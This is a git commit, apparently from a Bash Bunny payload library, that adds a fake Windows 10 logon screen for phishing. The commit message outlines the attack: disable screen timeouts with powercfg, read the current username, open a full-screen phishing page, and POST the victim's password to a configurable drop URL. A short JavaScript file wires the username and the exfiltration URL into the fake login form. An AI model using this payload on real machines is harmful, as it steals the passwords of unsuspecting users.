8f28d0ab0e841a4266a828d219ce7d2d2093f84e
TW-D <75358550+TW-D@users.noreply.github.com>
2022-01-07 14:47:55 -0500

    "Microsoft Windows 10" Fake Logon Screen (#482)
    1) Change "monitor-timeout (AC and DC)" at NEVER with "powercfg" utility.
    2) Change "standby-timeout (AC and DC)" at NEVER with "powercfg" utility.
    3) Retrieve the current username.
    4) Full-screen opening of the phishing HTML page using the default web browser with a random wallpaper.
    5) The "Bash Bunny" can be removed because the files are cached in the web browser.
    6) The password will be sent by HTTP POST to the URL specified in the "DROP_URL" constant.

---
+++ payloads/library/phishing/windows10_fakelogonscreen/phishing_files/assets/js/dispatch.js
@@ -0,0 +1,4 @@
+document.querySelector('div#username').innerText = CURRENT_USERNAME;
+document.querySelector('#drop').action = DROP_URL;
+document.querySelector('input#username').value = CURRENT_USERNAME;
+document.querySelector('.password').placeholder = INPUT_PLACEHOLDER;
